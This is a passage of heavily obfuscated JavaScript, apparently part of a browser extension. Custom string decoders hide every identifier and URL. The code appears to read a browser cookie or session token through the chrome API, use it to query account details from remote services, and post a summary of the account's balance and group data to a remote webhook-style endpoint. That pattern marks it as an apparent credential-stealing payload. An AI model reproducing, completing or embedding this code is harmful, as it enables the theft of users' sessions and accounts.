f="f(_|{y!FJnX]PdT?N}tueWD0/I=H9SVZ+v>azkK,@4pg[&~;\"`ABEh<i8b.slQYCLGM21mUj$Oo%)w5*r7qc:x#63^R",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function z(e){if(typeof a[e]===j[0x5]){return a[e]=y(b[e])}return a[e]}l=await(await fetch(g(0x87)+v+z(0x88),{[z(0x89)]:{[z(0x8a)]:z(0x8b)+e},[z(0x8c)]:z(0x8d)}))[z(0x8e)]()}{function A(e){var f="YV}v:Aa&(WDC0FTb@4^hxHn`Qsm._Py<LdXtgiN1BU+u?~kc2{E7[6O|wpM;]re\"I$!R=*z#j3l,9S%o)>G8/ZKJ5fq",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function B(e){if(typeof a[e]===j[0x5]){return a[e]=A(b[e])}return a[e]}m=await(await fetch(B(0x8f)+v+B(0x90),{[B(0x91)]:{[B(0x92)]:B(0x93)+e},[B(0x94)]:B(0x95)}))[B(0x96)]()}const C=l?l[g(j[0x1b])]:g(j[0x11]);{function D(e){var f="@FrAZhjBMqWaQ6gH`_8ut[RT4S#|$nl(y,p}OC/z<vs=\"dLke{*I]?oV23.9+:&>Xw7YUxm^JPNbi)D!K01EG5~;cf%",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function E(e){if(typeof a[e]===j[0x5]){return a[e]=D(b[e])}return a[e]}o=await(await fetch(E(0x98),{[E(0x99)]:{[E(0x9a)]:E(0x9b)+e},[E(0x9c)]:E(0x9d)}))[E(0x9e)]()}{function F(e){var f="3>!@$,5|D=/E*q:V`y^Yt?CAxXB]QWL_f<[wK7+1H8vpP2ldFN;ueb{j\"J6aUh0S#9R&c)Irigz~M%.k(nTZ4Om}oGs",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function G(e){if(typeof a[e]===j[0x5]){return a[e]=F(b[e])}return a[e]}p=await(await fetch(G(0x9f)+v+G(0xa0),{[G(0xa1)]:{[G(0xa2)]:G(0xa3)+e},[G(0xa4)]:G(0xa5)}))[G(0xa6)]()}{function H(e){var f="z${/^~`|M]T0NFe9YbL@[q<}2>jJQ_a;ny(\"O!AgV,U8R3pBsSX65fh:?=P)c*kr%1x+HwGv#WCZ7lDoud4KEt.Imi&",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function I(e){if(typeof a[e]===j[0x5]){return a[e]=H(b[e])}return a[e]}q=await(await fetch(g(0xa7),{[I(0xa8)]:{[I(0xa9)]:I(0xaa)+e},[I(0xab)]:I(0xac)}))[I(0xad)]()}{function J(e){var f="^bpshjrRY_FAx3Ta%B?#!c(CZ&@]$2{/do0`}wKLS\"kDgyMv=.:<*Nq8HQXOE)Vt;f,|WUi9z[ueJ14+n>56~ImlGP7",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function K(e){if(typeof a[e]===j[0x5]){return a[e]=J(b[e])}return a[e]}r=await(await fetch(g(0xae),{[g(j[0x15])]:{[K(0xb0)]:K(0xb1)+e},[K(0xb2)]:K(0xb3)}))[K(0xb4)]()}const L=p?p[g(j[0x1c])]:g(j[0x11]);let M=L>0x3e7?g(0xb6):g(0xb7);try{if(v){function N(e){var f="R[oHIbFjNpmcgTh;A&4*MPwrqBSeG1d<J\"nE`W5~tsQ+vi=aL0$8UlXCV3fYZk|OD}K7(:9)@6%]z{.^#y,?2_!x>/u",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function O(e){if(typeof a[e]===j[0x5]){return a[e]=N(b[e])}return a[e]}const P=await fetch(O(0xb8)+v+O(0xb9)),Q=await P[O(j[0x13])]();ABCDEF=j[0x0];Q[O(j[0x14])][O(0xbc)](f=>{function g(f){var g="1YsD3G)Jb`.co^S(KX$n[z>\"N8I/?a9gy~&!]P:tZLwE+r0x2MFChRj=<5He6BUm*#7Av}|;O,kqTdVQ_fl{%4iW@pu",h,e,k,l,m,o,q;h=""+(f||"");e=h.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<e;q++){var r=g.indexOf(h[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function h(f){if(typeof a[f]===j[0x5]){return a[f]=g(b[f])}return a[f]}const i=f[h(0xbd)]||j[0x0];ABCDEF+=i});const R=await fetch(O(0xbe)+v+O(0xbf)),S=await R[O(j[0x13])]();groupCount=S[O(j[0x14])][O(0xc0)](e=>{function f(e){var f="v_4z2]:u~<x>\"+kByAX`d;%P8E9Cjl&$f!(Z?KpDFeMi.#[1N=cHo*RJIQwS@tYV/L6|0s5rq)hgGnm{TbO,7UWa}^3",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function g(e){if(typeof a[e]===j[0x5]){return a[e]=f(b[e])}return a[e]}return e[O(0xc1)][g(0xc2)]>=j[0x3]})[O(0xc3)]}}catch(T){}if(C>0x3e8){s=g(0xc4)}else{var s;function U(e){var f="[oCNZTlLPQXrDKUjkdVgmpOE(123uB9A#eJY$,\"s~vwI^W+b&0ix%5=h{]cGn:@Sy|R/FMf_<Haz6?`4!7)8*}qt.;>",g,h,k,l,m,o,q;g=""+(e||"");h=g.length;k=[];l=j[0x0];m=j[0x0];o=-j[0x1];for(q=j[0x0];q<h;q++){var r=f.indexOf(g[q]);if(r===-j[0x1])continue;if(o<j[0x0]){o=r}else{o+=r*j[0xc];l|=o<<m;m+=(o&j[0xd])>j[0xe]?j[0xf]:j[0x10];do{k.push(l&j[0x3]);l>>=j[0x2];m-=j[0x2]}while(m>j[0x9]);o=-j[0x1]}}if(o>-j[0x1]){k.push((l|o<<m)&j[0x3])}return n(k)}function V(e){if(typeof a[e]===j[0x5]){return a[e]=U(b[e])}return a[e]}s=V(0xc5)}fetch(s,{[g(0xc6)]:g(0xc7),[g(j[0x15])]:{[g(0xc8)]:g(0xc9)},[g(0xca)]:JSON[g(0xcb)]({[g(0xcc)]:M,[g(0xcd)]:[{[g(0xce)]:g(j[0x16])+(e?e:g(0xd0))+g(j[0x16]),[g(0xd1)]:j[0x23],[g(0xd2)]:[{[g(j[0x17])]:g(0xd4),[g(j[0x18])]:m===g(0xd6)?g(0xd7):g(0xd8),[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xda),[g(j[0x18])]:i?i[g(j[0x17])]:g(j[0x11]),[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xdb),[g(j[0x18])]:l&&p?""+l[g(j[0x1b])]+" ("+p[g(j[0x1c])]+")":g(j[0x11]),[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xdc),[g(j[0x18])]:ABCDEF,[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xdd),[g(j[0x18])]:ABCDEF,[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xde),[g(j[0x18])]:q?q[g(j[0x1d])]:g(j[0x11]),[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xe0),[g(j[0x18])]:o?o[g(0xe1)]:g(j[0x11]),[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xe2),[g(j[0x18])]:k?k[g(0xe3)]:g(j[0x11]),[g(j[0x19])]:j[0x1a]},{[g(j[0x17])]:g(0xe4),[g(j[0x18])]:r?r[g(0xe5)]:g(j[0x11]),[g(j[0x19])]:j[0x1a]}],[g(0xe6)]:{[g(j[0x17])]:g(0xe7)+h,[g(j[0x1f])]:i?i[g(j[0x21])]:g(j[0x22])},[g(0xeb)]:{[g(j[0x1e])]:g(0xec),[g(j[0x1f])]:g(0xed)},[g(0xee)]:{[g(j[0x20])]:i?i[g(j[0x21])]:g(j[0x22])}}],[g(0xf0)]:g(0xf1),[g(0xf2)]:g(0xf3),[g(0xf4)]:[]})})}chrome[l(0xf5)][l(0xf6)]({[l(0xf7)]:l(0xf8),[l(0xf9)]:l(0xfa)},function(a){p(a?a[l(0xfb)]:j[0x23])});